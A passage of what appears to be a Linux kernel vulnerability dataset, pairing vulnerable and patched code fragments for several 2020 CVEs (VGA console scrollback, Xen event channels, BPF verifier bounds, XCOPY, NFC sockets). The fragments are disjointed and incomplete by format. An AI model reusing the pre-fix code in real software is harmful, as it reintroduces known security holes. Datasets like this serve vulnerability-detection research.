		this_dev = rcu_dereference_raw(this_lun->lun_se_dev);

		rc = target_xcopy_locate_se_dev_e4_iter(this_dev, dev_wwn);
 if (rc) {
 if (percpu_ref_tryget_live(&this_lun->lun_ref))
				found_dev = this_dev;
 break;
		}
	}
 rcu_read_unlock();
 if (found_dev == NULL)
 goto err_out;

 pr_debug(""lun_ref held for se_dev: %p se_dev->se_dev_group: %p\n"",
		 found_dev, &found_dev->dev_group);
	*_found_dev = found_dev;
	*_found_lun_ref = &this_lun->lun_ref;
 return 0;
err_out:
 pr_debug_ratelimited(""Unable to locate 0xe4 descriptor for EXTENDED_COPY\n"");
 return -EINVAL;
}

static int target_xcopy_parse_tiddesc_e4(struct se_cmd *se_cmd, struct xcopy_op *xop,

 switch (xop->op_origin) {
 case XCOL_SOURCE_RECV_OP:
		rc = target_xcopy_locate_se_dev_e4(se_cmd->se_sess,
						xop->dst_tid_wwn,
						&xop->dst_dev,
						&xop->remote_lun_ref);
 break;
 case XCOL_DEST_RECV_OP:
		rc = target_xcopy_locate_se_dev_e4(se_cmd->se_sess,
						xop->src_tid_wwn,
						&xop->src_dev,
						&xop->remote_lun_ref);
 break;
 default:
 pr_err(""XCOPY CSCD descriptor IDs not found in CSCD list - ""

static void xcopy_pt_undepend_remotedev(struct xcopy_op *xop)
{


 if (xop->op_origin == XCOL_SOURCE_RECV_OP)
 pr_debug(""putting dst lun_ref for %p\n"", xop->dst_dev);
 else
 pr_debug(""putting src lun_ref for %p\n"", xop->src_dev);





 percpu_ref_put(xop->remote_lun_ref);
}

static void xcopy_pt_release_cmd(struct se_cmd *se_cmd)
 struct se_device *dst_dev;
 unsigned char dst_tid_wwn[XCOPY_NAA_IEEE_REGEX_LEN];
 unsigned char local_dev_wwn[XCOPY_NAA_IEEE_REGEX_LEN];
 struct percpu_ref *remote_lun_ref;

 sector_t src_lba;
 sector_t dst_lba;
"
2021,,CVE-2020-28097,"CONFIG_FB_NVIDIA_I2C=y
CONFIG_FB_RADEON=y
# CONFIG_LCD_CLASS_DEVICE is not set
CONFIG_VGACON_SOFT_SCROLLBACK=y
CONFIG_LOGO=y
CONFIG_SOUND=y
CONFIG_SND=y
CONFIG_FB_SM501=m
CONFIG_FB_IBM_GXT4500=y
CONFIG_LCD_PLATFORM=m
CONFIG_VGACON_SOFT_SCROLLBACK=y
CONFIG_FRAMEBUFFER_CONSOLE=y
CONFIG_FRAMEBUFFER_CONSOLE_ROTATION=y
CONFIG_LOGO=y
CONFIG_FB_MODE_HELPERS=y
CONFIG_FB_TILEBLITTING=y
CONFIG_FB_EFI=y
CONFIG_VGACON_SOFT_SCROLLBACK=y
CONFIG_LOGO=y
# CONFIG_LOGO_LINUX_MONO is not set
# CONFIG_LOGO_LINUX_VGA16 is not set
CONFIG_FB_MODE_HELPERS=y
CONFIG_FB_TILEBLITTING=y
CONFIG_FB_EFI=y
CONFIG_VGACON_SOFT_SCROLLBACK=y
CONFIG_LOGO=y
# CONFIG_LOGO_LINUX_MONO is not set
# CONFIG_LOGO_LINUX_VGA16 is not set

	  Say Y.

config VGACON_SOFT_SCROLLBACK
       bool ""Enable Scrollback Buffer in System RAM""
       depends on VGA_CONSOLE
       default n
       help
	 The scrollback buffer of the standard VGA console is located in
	 the VGA RAM.  The size of this RAM is fixed and is quite small.
	 If you require a larger scrollback buffer, this can be placed in
	 System RAM which is dynamically allocated during initialization.
	 Placing the scrollback buffer in System RAM will slightly slow
	 down the console.

	 If you want this feature, say 'Y' here and enter the amount of
	 RAM to allocate for this buffer.  If unsure, say 'N'.

config VGACON_SOFT_SCROLLBACK_SIZE
       int ""Scrollback Buffer Size (in KB)""
       depends on VGACON_SOFT_SCROLLBACK
       range 1 1024
       default ""64""
       help
	  Enter the amount of System RAM to allocate for scrollback
	  buffers of VGA consoles. Each 64KB will give you approximately
	  16 80x25 screenfuls of scrollback buffer.

config VGACON_SOFT_SCROLLBACK_PERSISTENT_ENABLE_BY_DEFAULT
	bool ""Persistent Scrollback History for each console by default""
	depends on VGACON_SOFT_SCROLLBACK
	default n
	help
	  Say Y here if the scrollback history should persist by default when
	  switching between consoles. Otherwise, the scrollback history will be
	  flushed each time the console is switched. This feature can also be
	  enabled using the boot command line parameter
	  'vgacon.scrollback_persistent=1'.

	  This feature might break your tool of choice to flush the scrollback
	  buffer, e.g. clear(1) will work fine but Debian's clear_console(1)
	  will be broken, which might cause security issues.
	  You can use the escape sequence \e[3J instead if this feature is
	  activated.

	  Note that a buffer of VGACON_SOFT_SCROLLBACK_SIZE is taken for each
	  created tty device.
	  So if you use a RAM-constrained system, say N here.

config MDA_CONSOLE
	depends on !M68K && !PARISC && ISA
	tristate ""MDA text console (dual-headed)""
 write_vga(12, (c->vc_visible_origin - vga_vram_base) / 2);
}

#ifdef CONFIG_VGACON_SOFT_SCROLLBACK
/* software scrollback */
struct vgacon_scrollback_info {
 void *data;
 int tail;
 int size;
 int rows;
 int cnt;
 int cur;
 int save;
 int restore;
};

static struct vgacon_scrollback_info *vgacon_scrollback_cur;
static struct vgacon_scrollback_info vgacon_scrollbacks[MAX_NR_CONSOLES];
static bool scrollback_persistent = \
 IS_ENABLED(CONFIG_VGACON_SOFT_SCROLLBACK_PERSISTENT_ENABLE_BY_DEFAULT);
module_param_named(scrollback_persistent, scrollback_persistent, bool, 0000);
MODULE_PARM_DESC(scrollback_persistent, ""Enable persistent scrollback for all vga consoles"");

static void vgacon_scrollback_reset(int vc_num, size_t reset_size)
{
 struct vgacon_scrollback_info *scrollback = &vgacon_scrollbacks[vc_num];

 if (scrollback->data && reset_size > 0)
 memset(scrollback->data, 0, reset_size);

	scrollback->cnt  = 0;
	scrollback->tail = 0;
	scrollback->cur  = 0;
}

static void vgacon_scrollback_init(int vc_num)
{
 int pitch = vga_video_num_columns * 2;
 size_t size = CONFIG_VGACON_SOFT_SCROLLBACK_SIZE * 1024;
 int rows = size / pitch;
 void *data;

	data = kmalloc_array(CONFIG_VGACON_SOFT_SCROLLBACK_SIZE, 1024,
			     GFP_NOWAIT);

	vgacon_scrollbacks[vc_num].data = data;
	vgacon_scrollback_cur = &vgacon_scrollbacks[vc_num];

	vgacon_scrollback_cur->rows = rows - 1;
	vgacon_scrollback_cur->size = rows * pitch;

 vgacon_scrollback_reset(vc_num, size);
}

static void vgacon_scrollback_switch(int vc_num)
{
 if (!scrollback_persistent)
		vc_num = 0;

 if (!vgacon_scrollbacks[vc_num].data) {
 vgacon_scrollback_init(vc_num);
	} else {
 if (scrollback_persistent) {
			vgacon_scrollback_cur = &vgacon_scrollbacks[vc_num];
		} else {
 size_t size = CONFIG_VGACON_SOFT_SCROLLBACK_SIZE * 1024;

 vgacon_scrollback_reset(vc_num, size);
		}
	}
}

static void vgacon_scrollback_startup(void)
{
	vgacon_scrollback_cur = &vgacon_scrollbacks[0];
 vgacon_scrollback_init(0);
}

static void vgacon_scrollback_update(struct vc_data *c, int t, int count)
{
 void *p;

 if (!vgacon_scrollback_cur->data || !vgacon_scrollback_cur->size ||
	    c->vc_num != fg_console)
 return;

	p = (void *) (c->vc_origin + t * c->vc_size_row);

 while (count--) {
 if ((vgacon_scrollback_cur->tail + c->vc_size_row) >
		    vgacon_scrollback_cur->size)
			vgacon_scrollback_cur->tail = 0;

 scr_memcpyw(vgacon_scrollback_cur->data +
			    vgacon_scrollback_cur->tail,
			    p, c->vc_size_row);

		vgacon_scrollback_cur->cnt++;
		p += c->vc_size_row;
		vgacon_scrollback_cur->tail += c->vc_size_row;

 if (vgacon_scrollback_cur->tail >= vgacon_scrollback_cur->size)
			vgacon_scrollback_cur->tail = 0;

 if (vgacon_scrollback_cur->cnt > vgacon_scrollback_cur->rows)
			vgacon_scrollback_cur->cnt = vgacon_scrollback_cur->rows;

		vgacon_scrollback_cur->cur = vgacon_scrollback_cur->cnt;
	}
}

static void vgacon_restore_screen(struct vc_data *c)
{
	c->vc_origin = c->vc_visible_origin;
	vgacon_scrollback_cur->save = 0;

 if (!vga_is_gfx && !vgacon_scrollback_cur->restore) {
 scr_memcpyw((u16 *) c->vc_origin, (u16 *) c->vc_screenbuf,
			    c->vc_screenbuf_size > vga_vram_size ?
			    vga_vram_size : c->vc_screenbuf_size);
		vgacon_scrollback_cur->restore = 1;
		vgacon_scrollback_cur->cur = vgacon_scrollback_cur->cnt;
	}
}

static void vgacon_scrolldelta(struct vc_data *c, int lines)
{
 int start, end, count, soff;

 if (!lines) {
 vgacon_restore_screen(c);
 return;
	}

 if (!vgacon_scrollback_cur->data)
 return;

 if (!vgacon_scrollback_cur->save) {
 vgacon_cursor(c, CM_ERASE);
 vgacon_save_screen(c);
		c->vc_origin = (unsigned long)c->vc_screenbuf;
		vgacon_scrollback_cur->save = 1;
	}

	vgacon_scrollback_cur->restore = 0;
	start = vgacon_scrollback_cur->cur + lines;
	end = start + abs(lines);

 if (start < 0)
		start = 0;

 if (start > vgacon_scrollback_cur->cnt)
		start = vgacon_scrollback_cur->cnt;

 if (end < 0)
		end = 0;

 if (end > vgacon_scrollback_cur->cnt)
		end = vgacon_scrollback_cur->cnt;

	vgacon_scrollback_cur->cur = start;
	count = end - start;
	soff = vgacon_scrollback_cur->tail -
		((vgacon_scrollback_cur->cnt - end) * c->vc_size_row);
	soff -= count * c->vc_size_row;

 if (soff < 0)
		soff += vgacon_scrollback_cur->size;

	count = vgacon_scrollback_cur->cnt - start;

 if (count > c->vc_rows)
		count = c->vc_rows;

 if (count) {
 int copysize;

 int diff = c->vc_rows - count;
 void *d = (void *) c->vc_visible_origin;
 void *s = (void *) c->vc_screenbuf;

		count *= c->vc_size_row;
 /* how much memory to end of buffer left? */
		copysize = min(count, vgacon_scrollback_cur->size - soff);
 scr_memcpyw(d, vgacon_scrollback_cur->data + soff, copysize);
		d += copysize;
		count -= copysize;

 if (count) {
 scr_memcpyw(d, vgacon_scrollback_cur->data, count);
			d += count;
		}

 if (diff)
 scr_memcpyw(d, s, diff * c->vc_size_row);
	} else
 vgacon_cursor(c, CM_MOVE);
}

static void vgacon_flush_scrollback(struct vc_data *c)
{
 size_t size = CONFIG_VGACON_SOFT_SCROLLBACK_SIZE * 1024;

 vgacon_scrollback_reset(c->vc_num, size);
}
#else
#define vgacon_scrollback_startup(...) do { } while (0)
#define vgacon_scrollback_init(...)    do { } while (0)
#define vgacon_scrollback_update(...)  do { } while (0)
#define vgacon_scrollback_switch(...)  do { } while (0)

static void vgacon_restore_screen(struct vc_data *c)
{
 if (c->vc_origin != c->vc_visible_origin)
 vga_set_mem_top(c);
}

static void vgacon_flush_scrollback(struct vc_data *c)
{
}
#endif /* CONFIG_VGACON_SOFT_SCROLLBACK */

static const char *vgacon_startup(void)
{
 const char *display_desc = NULL;
	vgacon_xres = screen_info.orig_video_cols * VGA_FONTWIDTH;
	vgacon_yres = vga_scan_lines;

 if (!vga_init_done) {
 vgacon_scrollback_startup();
		vga_init_done = true;
	}

 return display_desc;
}
 vgacon_doresize(c, c->vc_cols, c->vc_rows);
	}

 vgacon_scrollback_switch(c->vc_num);
 return 0;		/* Redrawing not needed */
}

	oldo = c->vc_origin;
	delta = lines * c->vc_size_row;
 if (dir == SM_UP) {
 vgacon_scrollback_update(c, t, lines);
 if (c->vc_scr_end + delta >= vga_vram_end) {
 scr_memcpyw((u16 *) vga_vram_base,
				    (u16 *) (oldo + delta),
	.con_save_screen = vgacon_save_screen,
	.con_build_attr = vgacon_build_attr,
	.con_invert_region = vgacon_invert_region,
	.con_flush_scrollback = vgacon_flush_scrollback,
};
EXPORT_SYMBOL(vga_con);

","CONFIG_FB_NVIDIA_I2C=y
CONFIG_FB_RADEON=y
# CONFIG_LCD_CLASS_DEVICE is not set

CONFIG_LOGO=y
CONFIG_SOUND=y
CONFIG_SND=y
CONFIG_FB_SM501=m
CONFIG_FB_IBM_GXT4500=y
CONFIG_LCD_PLATFORM=m

CONFIG_FRAMEBUFFER_CONSOLE=y
CONFIG_FRAMEBUFFER_CONSOLE_ROTATION=y
CONFIG_LOGO=y
CONFIG_FB_MODE_HELPERS=y
CONFIG_FB_TILEBLITTING=y
CONFIG_FB_EFI=y

CONFIG_LOGO=y
# CONFIG_LOGO_LINUX_MONO is not set
# CONFIG_LOGO_LINUX_VGA16 is not set
CONFIG_FB_MODE_HELPERS=y
CONFIG_FB_TILEBLITTING=y
CONFIG_FB_EFI=y

CONFIG_LOGO=y
# CONFIG_LOGO_LINUX_MONO is not set
# CONFIG_LOGO_LINUX_VGA16 is not set

	  Say Y.















































config MDA_CONSOLE
	depends on !M68K && !PARISC && ISA
	tristate ""MDA text console (dual-headed)""
 write_vga(12, (c->vc_visible_origin - vga_vram_base) / 2);
}

















































































































































































































static void vgacon_restore_screen(struct vc_data *c)
{
 if (c->vc_origin != c->vc_visible_origin)
 vga_set_mem_top(c);
}






static const char *vgacon_startup(void)
{
 const char *display_desc = NULL;
	vgacon_xres = screen_info.orig_video_cols * VGA_FONTWIDTH;
	vgacon_yres = vga_scan_lines;

	vga_init_done = true;




 return display_desc;
}
 vgacon_doresize(c, c->vc_cols, c->vc_rows);
	}


 return 0;		/* Redrawing not needed */
}

	oldo = c->vc_origin;
	delta = lines * c->vc_size_row;
 if (dir == SM_UP) {

 if (c->vc_scr_end + delta >= vga_vram_end) {
 scr_memcpyw((u16 *) vga_vram_base,
				    (u16 *) (oldo + delta),
	.con_save_screen = vgacon_save_screen,
	.con_build_attr = vgacon_build_attr,
	.con_invert_region = vgacon_invert_region,

};
EXPORT_SYMBOL(vga_con);

"
2021,,CVE-2020-27830,,
2020,DoS +Info ,CVE-2020-27825,,
2021,,CVE-2020-27820,,
2021,Mem. Corr. ,CVE-2020-27815,,
2020,Exec Code Mem. Corr. ,CVE-2020-27786,,
2020,,CVE-2020-27777,,
2020,,CVE-2020-27675,"#include <linux/slab.h>
#include <linux/irqnr.h>
#include <linux/pci.h>


#ifdef CONFIG_X86
#include <asm/desc.h>
 */
static DEFINE_MUTEX(irq_mapping_update_lock);


















static LIST_HEAD(xen_irq_list_head);

/* IRQ <-> VIRQ mapping. */
 unsigned col;

 for (col = 0; col < EVTCHN_PER_ROW; col++)
		evtchn_to_irq[row][col] = -1;
}

static void clear_evtchn_to_irq_all(void)
 clear_evtchn_to_irq_row(row);
	}

	evtchn_to_irq[row][col] = irq;
 return 0;
}

 return -1;
 if (evtchn_to_irq[EVTCHN_ROW(evtchn)] == NULL)
 return -1;
 return evtchn_to_irq[EVTCHN_ROW(evtchn)][EVTCHN_COL(evtchn)];
}

/* Get info for IRQ */
 */
evtchn_port_t evtchn_from_irq(unsigned irq)
{
 if (WARN(irq >= nr_irqs, ""Invalid irq %d!\n"", irq))




 return 0;

 return info_for_irq(irq)->evtchn;
}

unsigned int irq_from_evtchn(evtchn_port_t evtchn)
static void xen_free_irq(unsigned irq)
{
 struct irq_info *info = info_for_irq(irq);


 if (WARN_ON(!info))
 return;



 list_del(&info->list);

 set_info_for_irq(irq, NULL);

 WARN_ON(info->refcnt > 0);



 kfree(info);

 /* Legacy IRQ descriptors are managed by the arch. */
 struct vcpu_info *vcpu_info = __this_cpu_read(xen_vcpu);
 int cpu = smp_processor_id();



 do {
		vcpu_info->evtchn_upcall_pending = 0;

 virt_rmb(); /* Hypervisor can set upcall pending. */

	} while (vcpu_info->evtchn_upcall_pending);


}

void xen_evtchn_do_upcall(struct pt_regs *regs)
","#include <linux/slab.h>
#include <linux/irqnr.h>
#include <linux/pci.h>
#include <linux/spinlock.h>

#ifdef CONFIG_X86
#include <asm/desc.h>
 */
static DEFINE_MUTEX(irq_mapping_update_lock);

/*
 * Lock protecting event handling loop against removing event channels.
 * Adding of event channels is no issue as the associated IRQ becomes active
 * only after everything is setup (before request_[threaded_]irq() the handler
 * can't be entered for an event, as the event channel will be unmasked only
 * then).
 */
static DEFINE_RWLOCK(evtchn_rwlock);

/*
 * Lock hierarchy:
 *
 * irq_mapping_update_lock
 *   evtchn_rwlock
 *     IRQ-desc lock
 */

static LIST_HEAD(xen_irq_list_head);

/* IRQ <-> VIRQ mapping. */
 unsigned col;

 for (col = 0; col < EVTCHN_PER_ROW; col++)
 WRITE_ONCE(evtchn_to_irq[row][col], -1);
}

static void clear_evtchn_to_irq_all(void)
 clear_evtchn_to_irq_row(row);
	}

 WRITE_ONCE(evtchn_to_irq[row][col], irq);
 return 0;
}

 return -1;
 if (evtchn_to_irq[EVTCHN_ROW(evtchn)] == NULL)
 return -1;
 return READ_ONCE(evtchn_to_irq[EVTCHN_ROW(evtchn)][EVTCHN_COL(evtchn)]);
}

/* Get info for IRQ */
 */
evtchn_port_t evtchn_from_irq(unsigned irq)
{
 const struct irq_info *info = NULL;

 if (likely(irq < nr_irqs))
		info = info_for_irq(irq);
 if (!info)
 return 0;

 return info->evtchn;
}

unsigned int irq_from_evtchn(evtchn_port_t evtchn)
static void xen_free_irq(unsigned irq)
{
 struct irq_info *info = info_for_irq(irq);
 unsigned long flags;

 if (WARN_ON(!info))
 return;

 write_lock_irqsave(&evtchn_rwlock, flags);

 list_del(&info->list);

 set_info_for_irq(irq, NULL);

 WARN_ON(info->refcnt > 0);

 write_unlock_irqrestore(&evtchn_rwlock, flags);

 kfree(info);

 /* Legacy IRQ descriptors are managed by the arch. */
 struct vcpu_info *vcpu_info = __this_cpu_read(xen_vcpu);
 int cpu = smp_processor_id();

 read_lock(&evtchn_rwlock);

 do {
		vcpu_info->evtchn_upcall_pending = 0;

 virt_rmb(); /* Hypervisor can set upcall pending. */

	} while (vcpu_info->evtchn_upcall_pending);

 read_unlock(&evtchn_rwlock);
}

void xen_evtchn_do_upcall(struct pt_regs *regs)
"
2020,DoS ,CVE-2020-27673,"			improve timer resolution at the expense of processing
			more timer interrupts.









	nopv=		[X86,XEN,KVM,HYPER_V,VMWARE]
			Disables the PV optimizations forcing the guest to run
			as generic guest with no PV drivers. Currently support
 * a bitset of words which contain pending event bits.  The second
 * level is a bitset of pending events themselves.
 */
static void evtchn_2l_handle_events(unsigned cpu)
{
 int irq;
 xen_ulong_t pending_words;

 /* Process port. */
			port = (word_idx * BITS_PER_EVTCHN_WORD) + bit_idx;
			irq = get_evtchn_to_irq(port);

 if (irq != -1)
 generic_handle_irq(irq);

			bit_idx = (bit_idx + 1) % BITS_PER_EVTCHN_WORD;

#include <linux/pci.h>
#include <linux/spinlock.h>
#include <linux/cpuhotplug.h>



#ifdef CONFIG_X86
#include <asm/desc.h>

#include ""events_internal.h""










const struct evtchn_ops *evtchn_ops;

/*
 * irq_mapping_update_lock
 *   evtchn_rwlock
 *     IRQ-desc lock

 */

static LIST_HEAD(xen_irq_list_head);
static void enable_dynirq(struct irq_data *data);
static void disable_dynirq(struct irq_data *data);



static void clear_evtchn_to_irq_row(unsigned row)
{
 unsigned col;
}
EXPORT_SYMBOL_GPL(notify_remote_via_irq);

















































static void xen_irq_lateeoi_locked(struct irq_info *info)
{
 evtchn_port_t evtchn;


	evtchn = info->evtchn;
 if (!VALID_EVTCHN(evtchn))
 return;








 unmask_evtchn(evtchn);
}
















































void xen_irq_lateeoi(unsigned int irq, unsigned int eoi_flags)
{
 struct irq_info *info;
static void xen_irq_init(unsigned irq)
{
 struct irq_info *info;

#ifdef CONFIG_SMP
 /* By default all event channels notify CPU#0. */
 cpumask_copy(irq_get_affinity_mask(irq), cpumask_of(0));

 set_info_for_irq(irq, info);


 list_add_tail(&info->list, &xen_irq_list_head);
}


 write_lock_irqsave(&evtchn_rwlock, flags);




 list_del(&info->list);

 set_info_for_irq(irq, NULL);
 notify_remote_via_irq(irq);
}

















































static void __xen_evtchn_do_upcall(void)
{
 struct vcpu_info *vcpu_info = __this_cpu_read(xen_vcpu);
 int cpu = smp_processor_id();


 read_lock(&evtchn_rwlock);

 do {
		vcpu_info->evtchn_upcall_pending = 0;

 xen_evtchn_handle_events(cpu);

 BUG_ON(!irqs_disabled());

	} while (vcpu_info->evtchn_upcall_pending);

 read_unlock(&evtchn_rwlock);







}

void xen_evtchn_do_upcall(struct pt_regs *regs)
static inline void xen_alloc_callback_vector(void) {}
#endif

#undef MODULE_PARAM_PREFIX
#define MODULE_PARAM_PREFIX ""xen.""

static bool fifo_events = true;
module_param(fifo_events, bool, 0);

static int xen_evtchn_cpu_prepare(unsigned int cpu)
{
 int ret = 0;



 if (evtchn_ops->percpu_init)
		ret = evtchn_ops->percpu_init(cpu);

 if (ret < 0)
 xen_evtchn_2l_init();



 cpuhp_setup_state_nocalls(CPUHP_XEN_EVTCHN_PREPARE,
 ""xen/evtchn:prepare"",
				  xen_evtchn_cpu_prepare, xen_evtchn_cpu_dead);
","			improve timer resolution at the expense of processing
			more timer interrupts.

	xen.event_eoi_delay=	[XEN]
			How long to delay EOI handling in case of event
			storms (jiffies). Default is 10.

	xen.event_loop_timeout=	[XEN]
			After which time (jiffies) the event handling loop
			should start to delay EOI handling. Default is 2.

	nopv=		[X86,XEN,KVM,HYPER_V,VMWARE]
			Disables the PV optimizations forcing the guest to run
			as generic guest with no PV drivers. Currently support
 * a bitset of words which contain pending event bits.  The second
 * level is a bitset of pending events themselves.
 */
static void evtchn_2l_handle_events(unsigned cpu, struct evtchn_loop_ctrl *ctrl)
{
 int irq;
 xen_ulong_t pending_words;

 /* Process port. */
			port = (word_idx * BITS_PER_EVTCHN_WORD) + bit_idx;
 handle_irq_for_port(port, ctrl);




			bit_idx = (bit_idx + 1) % BITS_PER_EVTCHN_WORD;

#include <linux/pci.h>
#include <linux/spinlock.h>
#include <linux/cpuhotplug.h>
#include <linux/atomic.h>
#include <linux/ktime.h>

#ifdef CONFIG_X86
#include <asm/desc.h>

#include ""events_internal.h""

#undef MODULE_PARAM_PREFIX
#define MODULE_PARAM_PREFIX ""xen.""

static uint __read_mostly event_loop_timeout = 2;
module_param(event_loop_timeout, uint, 0644);

static uint __read_mostly event_eoi_delay = 10;
module_param(event_eoi_delay, uint, 0644);

const struct evtchn_ops *evtchn_ops;

/*
 * irq_mapping_update_lock
 *   evtchn_rwlock
 *     IRQ-desc lock
 *       percpu eoi_list_lock
 */

static LIST_HEAD(xen_irq_list_head);
static void enable_dynirq(struct irq_data *data);
static void disable_dynirq(struct irq_data *data);

static DEFINE_PER_CPU(unsigned int, irq_epoch);

static void clear_evtchn_to_irq_row(unsigned row)
{
 unsigned col;
}
EXPORT_SYMBOL_GPL(notify_remote_via_irq);

struct lateeoi_work {
 struct delayed_work delayed;
 spinlock_t eoi_list_lock;
 struct list_head eoi_list;
};

static DEFINE_PER_CPU(struct lateeoi_work, lateeoi);

static void lateeoi_list_del(struct irq_info *info)
{
 struct lateeoi_work *eoi = &per_cpu(lateeoi, info->eoi_cpu);
 unsigned long flags;

 spin_lock_irqsave(&eoi->eoi_list_lock, flags);
 list_del_init(&info->eoi_list);
 spin_unlock_irqrestore(&eoi->eoi_list_lock, flags);
}

static void lateeoi_list_add(struct irq_info *info)
{
 struct lateeoi_work *eoi = &per_cpu(lateeoi, info->eoi_cpu);
 struct irq_info *elem;
	u64 now = get_jiffies_64();
 unsigned long delay;
 unsigned long flags;

 if (now < info->eoi_time)
		delay = info->eoi_time - now;
 else
		delay = 1;

 spin_lock_irqsave(&eoi->eoi_list_lock, flags);

 if (list_empty(&eoi->eoi_list)) {
 list_add(&info->eoi_list, &eoi->eoi_list);
 mod_delayed_work_on(info->eoi_cpu, system_wq,
				    &eoi->delayed, delay);
	} else {
 list_for_each_entry_reverse(elem, &eoi->eoi_list, eoi_list) {
 if (elem->eoi_time <= info->eoi_time)
 break;
		}
 list_add(&info->eoi_list, &elem->eoi_list);
	}

 spin_unlock_irqrestore(&eoi->eoi_list_lock, flags);
}

static void xen_irq_lateeoi_locked(struct irq_info *info)
{
 evtchn_port_t evtchn;
 unsigned int cpu;

	evtchn = info->evtchn;
 if (!VALID_EVTCHN(evtchn) || !list_empty(&info->eoi_list))
 return;

	cpu = info->eoi_cpu;
 if (info->eoi_time && info->irq_epoch == per_cpu(irq_epoch, cpu)) {
 lateeoi_list_add(info);
 return;
	}

	info->eoi_time = 0;
 unmask_evtchn(evtchn);
}

static void xen_irq_lateeoi_worker(struct work_struct *work)
{
 struct lateeoi_work *eoi;
 struct irq_info *info;
	u64 now = get_jiffies_64();
 unsigned long flags;

	eoi = container_of(to_delayed_work(work), struct lateeoi_work, delayed);

 read_lock_irqsave(&evtchn_rwlock, flags);

 while (true) {
 spin_lock(&eoi->eoi_list_lock);

		info = list_first_entry_or_null(&eoi->eoi_list, struct irq_info,
						eoi_list);

 if (info == NULL || now < info->eoi_time) {
 spin_unlock(&eoi->eoi_list_lock);
 break;
		}

 list_del_init(&info->eoi_list);

 spin_unlock(&eoi->eoi_list_lock);

		info->eoi_time = 0;

 xen_irq_lateeoi_locked(info);
	}

 if (info)
 mod_delayed_work_on(info->eoi_cpu, system_wq,
				    &eoi->delayed, info->eoi_time - now);

 read_unlock_irqrestore(&evtchn_rwlock, flags);
}

static void xen_cpu_init_eoi(unsigned int cpu)
{
 struct lateeoi_work *eoi = &per_cpu(lateeoi, cpu);

 INIT_DELAYED_WORK(&eoi->delayed, xen_irq_lateeoi_worker);
 spin_lock_init(&eoi->eoi_list_lock);
 INIT_LIST_HEAD(&eoi->eoi_list);
}

void xen_irq_lateeoi(unsigned int irq, unsigned int eoi_flags)
{
 struct irq_info *info;
static void xen_irq_init(unsigned irq)
{
 struct irq_info *info;

#ifdef CONFIG_SMP
 /* By default all event channels notify CPU#0. */
 cpumask_copy(irq_get_affinity_mask(irq), cpumask_of(0));

 set_info_for_irq(irq, info);

 INIT_LIST_HEAD(&info->eoi_list);
 list_add_tail(&info->list, &xen_irq_list_head);
}


 write_lock_irqsave(&evtchn_rwlock, flags);

 if (!list_empty(&info->eoi_list))
 lateeoi_list_del(info);

 list_del(&info->list);

 set_info_for_irq(irq, NULL);
 notify_remote_via_irq(irq);
}

struct evtchn_loop_ctrl {
 ktime_t timeout;
 unsigned count;
 bool defer_eoi;
};

void handle_irq_for_port(evtchn_port_t port, struct evtchn_loop_ctrl *ctrl)
{
 int irq;
 struct irq_info *info;

	irq = get_evtchn_to_irq(port);
 if (irq == -1)
 return;

 /*
	 * Check for timeout every 256 events.
	 * We are setting the timeout value only after the first 256
	 * events in order to not hurt the common case of few loop
	 * iterations. The 256 is basically an arbitrary value.
	 *
	 * In case we are hitting the timeout we need to defer all further
	 * EOIs in order to ensure to leave the event handling loop rather
	 * sooner than later.
 */
 if (!ctrl->defer_eoi && !(++ctrl->count & 0xff)) {
 ktime_t kt = ktime_get();

 if (!ctrl->timeout) {
			kt = ktime_add_ms(kt,
 jiffies_to_msecs(event_loop_timeout));
			ctrl->timeout = kt;
		} else if (kt > ctrl->timeout) {
			ctrl->defer_eoi = true;
		}
	}

	info = info_for_irq(irq);

 if (ctrl->defer_eoi) {
		info->eoi_cpu = smp_processor_id();
		info->irq_epoch = __this_cpu_read(irq_epoch);
		info->eoi_time = get_jiffies_64() + event_eoi_delay;
	}

 generic_handle_irq(irq);
}

static void __xen_evtchn_do_upcall(void)
{
 struct vcpu_info *vcpu_info = __this_cpu_read(xen_vcpu);
 int cpu = smp_processor_id();
 struct evtchn_loop_ctrl ctrl = { 0 };

 read_lock(&evtchn_rwlock);

 do {
		vcpu_info->evtchn_upcall_pending = 0;

 xen_evtchn_handle_events(cpu, &ctrl);

 BUG_ON(!irqs_disabled());

	} while (vcpu_info->evtchn_upcall_pending);

 read_unlock(&evtchn_rwlock);

 /*
	 * Increment irq_epoch only now to defer EOIs only for
	 * xen_irq_lateeoi() invocations occurring from inside the loop
	 * above.
 */
 __this_cpu_inc(irq_epoch);
}

void xen_evtchn_do_upcall(struct pt_regs *regs)
static inline void xen_alloc_callback_vector(void) {}
#endif




static bool fifo_events = true;
module_param(fifo_events, bool, 0);

static int xen_evtchn_cpu_prepare(unsigned int cpu)
{
 int ret = 0;

 xen_cpu_init_eoi(cpu);

 if (evtchn_ops->percpu_init)
		ret = evtchn_ops->percpu_init(cpu);

 if (ret < 0)
 xen_evtchn_2l_init();

 xen_cpu_init_eoi(smp_processor_id());

 cpuhp_setup_state_nocalls(CPUHP_XEN_EVTCHN_PREPARE,
 ""xen/evtchn:prepare"",
				  xen_evtchn_cpu_prepare, xen_evtchn_cpu_dead);
"
2020,Overflow ,CVE-2020-27194," bool src_known = tnum_subreg_is_const(src_reg->var_off);
 bool dst_known = tnum_subreg_is_const(dst_reg->var_off);
 struct tnum var32_off = tnum_subreg(dst_reg->var_off);
	s32 smin_val = src_reg->smin_value;
	u32 umin_val = src_reg->umin_value;

 /* Assuming scalar64_min_max_or will be called so it is safe
	 * to skip updating register for known case.
 /* ORing two positives gives a positive, so safe to
		 * cast result into s64.
 */
		dst_reg->s32_min_value = dst_reg->umin_value;
		dst_reg->s32_max_value = dst_reg->umax_value;
	}
}

"," bool src_known = tnum_subreg_is_const(src_reg->var_off);
 bool dst_known = tnum_subreg_is_const(dst_reg->var_off);
 struct tnum var32_off = tnum_subreg(dst_reg->var_off);
	s32 smin_val = src_reg->s32_min_value;
	u32 umin_val = src_reg->u32_min_value;

 /* Assuming scalar64_min_max_or will be called so it is safe
	 * to skip updating register for known case.
 /* ORing two positives gives a positive, so safe to
		 * cast result into s64.
 */
		dst_reg->s32_min_value = dst_reg->u32_min_value;
		dst_reg->s32_max_value = dst_reg->u32_max_value;
	}
}

"
2021,#NAME?,CVE-2020-27171,,
2021,#NAME?,CVE-2020-27170,,
2020,,CVE-2020-27152,,
2020,,CVE-2020-26541,,
2021,,CVE-2020-26147,,
2020,Bypass ,CVE-2020-26088," if ((sock->type != SOCK_SEQPACKET) && (sock->type != SOCK_RAW))
 return -ESOCKTNOSUPPORT;

 if (sock->type == SOCK_RAW)


		sock->ops = &rawsock_raw_ops;
 else
